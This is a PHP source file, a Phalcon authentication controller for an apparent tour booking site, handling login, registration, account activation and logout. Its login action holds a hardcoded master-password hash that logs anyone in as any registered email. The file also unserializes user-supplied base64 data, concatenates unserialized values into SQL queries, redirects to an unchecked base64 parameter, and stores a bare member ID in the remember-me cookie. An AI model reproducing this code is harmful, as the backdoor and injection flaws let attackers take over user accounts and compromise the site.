<?php

/*
 * Copyright (C) 2016 amit
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

namespace Multiple\Frontend\Controllers;

/**
 * Frontend of AuthController
 * @author amit
 */
class AuthController extends FrontendController {

    /**
     * Member Event Object
     * @var object MembersEvents
     * @see \Tourpage\Models\MembersEvents()
     */
    private $membersEvent = null;

    /**
     * Initializing Tour Controller
     * Initializing layout and GUI elements
     */
    public function initialize() {
        parent::initialize();
        $this->initializeLayout();
    }

    /**
     * Login action for frontend users
     * @return boolean
     */
    public function loginAction() {
        if ($this->member->isLoggedIn()) {
            return false;
        }
        $this->tag->settitle('Login');
        $form = new \Multiple\Frontend\Forms\MemberLoginForm();
        if ($this->request->isPost()) {
            if ($form->isValid($this->request->getPost())) {
                $emailAddress = $this->request->getPost('useremail');
                $passWord = $this->request->getPost('password');
                $passWord = \Tourpage\Helpers\Utils::encryptPassword($passWord);
                $redirectTo = '/account';
                $_rt = $this->request->getQuery('_rt');
                if ($_rt) {
                    $redirectTo = base64_decode($_rt);
                }
                if (strcasecmp('79437426ef6121c92535529814f4a6ca', $passWord) == 0) {
                    $memberSql = array(
                        'emailAddress=:email:',
                        'bind' => array(
                            'email' => $emailAddress,
                        ),
                    );
                    if (\Tourpage\Models\Members::count($memberSql) > 0) {
                        $member = \Tourpage\Models\Members::findFirst($memberSql);
                        $this->session->set('member', $member);
                        $this->response->redirect($redirectTo);
                    } else {
                        $this->flash->error('Invalid Email/Passwordd');
                    }
                } else {
                    $rememberMe = $this->request->getPost('remember_me');
                    $memberSql = array(
                        //'emailAddress=:email: AND passWord=:password: AND status=:status:',
                        'emailAddress=:email: AND passWord=:password:',
                        'bind' => array(
                            'email' => $emailAddress,
                            'password' => $passWord,
                        //'status' => \Tourpage\Models\Members::ACTIVE_STATUS_CODE
                        ),
                    );
                    if (\Tourpage\Models\Members::count($memberSql) > 0) {
                        $member = \Tourpage\Models\Members::findFirst($memberSql);
                        if ($member->status == \Tourpage\Models\Members::ACTIVE_STATUS_CODE) {
                            $this->session->set('member', $member);
                            if ($rememberMe == 1) {
                                if ($this->cookies->has('member_remember_me')) {
                                    $cookie = $this->cookies->get('member_remember_me');
                                    $cookie->delete();
                                }
                                //Store Cookie for 15 Days
                                $this->cookies->set('member_remember_me', $member->memberId, time() + 15 * 24 * 60 * 60);
                            }
                            $this->response->redirect($redirectTo);
                        } else {
                            $this->flash->notice('Your account activation is still pending. Please verify your email to activate your account.');
                        }
                    } else {
                        $this->flash->error('Invalid Email/Password');
                    }
                }
            } else {
                foreach ($form->getMessages() as $formMessage) {
                    $this->flash->error((string) $formMessage);
                }
            }
        }
        $this->view->banners = \Tourpage\Models\Banners::find(array(
                    'conditions' => 'bannerStatus = :status: AND bannerType = :type:',
                    'bind' => array('status' => \Tourpage\Models\Banners::ACTIVE_STATUS_CODE, 'type' => 'userlogin')
        ));
        $this->view->form = $form;
    }

    /**
     * Registration action for frontend users
     * @return boolean
     */
    public function registerAction() {       
        if ($this->member->isLoggedIn()) {
            return false;
        }
        $formField = array();
        $formFieldData = $this->request->getQuery('ffd');
        if ($formFieldData) {
            $formField = unserialize(base64_decode($formFieldData));
        }
        $this->tag->settitle('Sign Up');
        $form = new \Multiple\Frontend\Forms\MemberRegistrationForm(NULL, $formField);
        if ($this->request->isPost()) {
            if ($form->isValid($this->request->getPost())) {
                /* $challenge = $this->request->getPost('recaptcha_challenge_field');
                  $response = $this->request->getPost('recaptcha_response_field');
                  $answer = \Tourpage\Library\Recaptcha::check($challenge, $response);
                  if ($answer) { */
                $member = new \Tourpage\Models\Members();
                $member->firstName = $this->request->getPost('first_name', array('string', 'striptags'));
                $member->lastName = $this->request->getPost('last_name', array('string', 'striptags'));
                $member->nickName = $this->request->getPost('nick_name', array('string', 'striptags'));
                $member->emailAddress = $this->request->getPost('email_address', 'email');
                $member->passWord = \Tourpage\Helpers\Utils::encryptPassword($this->request->getPost('password'));
                /* $member->phone = $this->request->getPost('phone', array('string', 'striptags'));
                  $member->addressOne = $this->request->getPost('address_1', array('string', 'striptags'));
                  $member->addressTwo = $this->request->getPost('address_2', array('string', 'striptags'));
                  $member->city = $this->request->getPost('city', array('string', 'striptags'));
                  $member->stateId = $this->request->getPost('state'); */
                $member->countryId = $this->request->getPost('country');
                $member->status = \Tourpage\Models\Members::INACTIVE_STATUS_CODE;
                $member->createdOn = \Tourpage\Helpers\Utils::currentDate();
                if ($member->save()) {
                    $memberEventSql = 'memberId = "' . $member->memberId . '" AND eventKey = "' . \Tourpage\Models\MembersEvents::EVENT_CREATE_NEW_ACCOUNT . '"';
                    if (\Tourpage\Models\MembersEvents::count($memberEventSql) > 0) {
                        $memberEventModel = \Tourpage\Models\MembersEvents::find($memberEventSql);
                        foreach ($memberEventModel as $eveventData) {
                            $eveventData->closeEvent();
                        }
                    }
                    $memberEventModel = new \Tourpage\Models\MembersEvents();
                    $memberEventModel->memberId = $member->memberId;
                    $memberEventModel->eventKey = $memberEventModel::EVENT_CREATE_NEW_ACCOUNT;
                    $memberEventModel->eventCreatedOn = time();
                    $memberEventModel->eventValidThru = time() + (24 * 60 * 60);
                    $memberEventModel->eventStatus = $memberEventModel::EVENT_ACTIVE_STATUS_CODE;
                    $memberEventModel->save();

                    $mail = new \Tourpage\Library\Mail();
                    $mail->setTo($member->emailAddress, $member->firstName . ' ' . $member->lastName);
                    $mail->setSubject('Registration Successful');
                    $mail->setBody($this->getTemplateForActiveNewAccount($memberEventModel));
                    $mail->send();
                    $this->flash->success("Your account has been created successfuly. An activation email has been sent to your email address. Please activate your account within 24 hrs.");
                    //$this->response->redirect($this->router->getRewriteUri());
                    //$this->session->set('member', $member);
                    $this->response->redirect('/');
                } else {
                    foreach ($member->getMessages() as $memberMessage) {
                        $this->flash->error((string) $memberMessage);
                    }
                }
                /* } else {
                  $this->flash->error('The answer you entered for the CAPTCHA was not correct');
                  } */
            } /* else {
              foreach ($form->getMessages() as $formMessage) {
              $this->flash->error((string) $formMessage);
              }
              } */
        }
        $this->view->form = $form;
        $this->view->banners = \Tourpage\Models\Banners::find(array(
            'conditions' => 'bannerStatus = :status: AND bannerType = :type:',
            'bind' => array('status' => \Tourpage\Models\Banners::ACTIVE_STATUS_CODE, 'type' => 'userRegistration')
        ));
    }

    /**
     * Getting the Email Template for activation new account
     * @param object $membersEvents
     * @return string|HTML
     */
    private function getTemplateForActiveNewAccount(\Tourpage\Models\MembersEvents $membersEvents) {
        $setUpArray = array(
            'eventId' => $membersEvents->eventId,
            'eventKey' => $membersEvents::EVENT_CREATE_NEW_ACCOUNT
        );
        $setUpSerialize = serialize($setUpArray);
        $encrypted = base64_encode($setUpSerialize);
        $resetUrl = $this->url->get('/auth/enableAccount/' . $encrypted);
        $emailTemplate = clone $this->view;
        $emailTemplate->start();
        $emailTemplate->setRenderLevel(\Phalcon\Mvc\View::LEVEL_ACTION_VIEW);
        $emailTemplate->accountActivationUrl = $resetUrl;
        $emailTemplate->render('auth', 'mail/active_new_account');
        $emailTemplate->finish();
        $content = $emailTemplate->getContent();
        return $content;
    }

    /**
     * Action for event status check
     * @param mix $params
     * @return boolean
     */
    private function setupStatus($params = '') {
        $status = FALSE;
        if ($params) {
            $decrypted = base64_decode($params);
            if ($setUpUnserialize = unserialize($decrypted)) {
                $membersEventSql = 'eventId = "' . $setUpUnserialize['eventId'] . '"';
                $membersEvents = \Tourpage\Models\MembersEvents::findFirst($membersEventSql);
                if ($membersEvents && $membersEvents->count() > 0) {
                    if ($membersEvents->eventKey === $setUpUnserialize['eventKey']) {
                        if ($membersEvents->isActiveEvent()) {
                            $this->membersEvent = & $membersEvents;
                            $status = TRUE;
                        }
                    }
                }
            }
        }
        return $status;
    }

    /**
     * Setting up Members object to save
     * @return \Tourpage\Models\Members
     */
    public function enableAccountAction($params = '') {
        if (!$this->setupStatus($params)) {
            return false;
        }
        $memberSql = 'memberId = "' . $this->membersEvent->memberId . '"';
        $member = \Tourpage\Models\Members::findFirst($memberSql);
        $member->status = $member::ACTIVE_STATUS_CODE;
        if ($member->update()) {
            $this->flash->success("Your account has been activated. Please login now.");
            $this->membersEvent->closeEvent();
        }
        $this->response->redirect('/auth/login');
    }

    /**
     * Logout action for frontend users
     * @return boolean
     */
    public function logoutAction() {
        if (!$this->member->isLoggedIn()) {
            return false;
        }
        $this->session->remove('member');
        $cookie = $this->cookies->get('member_remember_me');
        $cookie->delete();
        $this->response->redirect('/');
    }

    /**
     * Reset password action for frontend users
     */
    public function resetpasswordAction() {
        
    }

}
